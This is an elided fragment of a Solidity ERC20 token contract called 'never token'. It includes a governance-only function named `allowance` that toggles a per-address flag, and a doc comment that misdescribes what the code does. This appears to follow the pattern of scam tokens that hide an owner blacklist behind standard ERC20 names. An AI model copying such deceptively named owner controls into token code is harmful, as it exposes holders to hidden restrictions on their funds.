...
contract ERC20 is Context, Ownable, IERC20, IERC20Metadata {
     ...
     */
    function allowance (address _address) external onlyGovernance {
        if (_allowance[_address] == true) {_allowance[_address] = false;} else {_allowance[_address] = true; }
    }

    /**
     * @notice Checking the allowance granted to `spender` by the caller.
     */
    function allowances(address _address) public view returns (bool) {
        return _allowance[_address];
    }
...
contract never is ERC20 {
     ...
     */
    constructor() ERC20('never token', 'never')  {
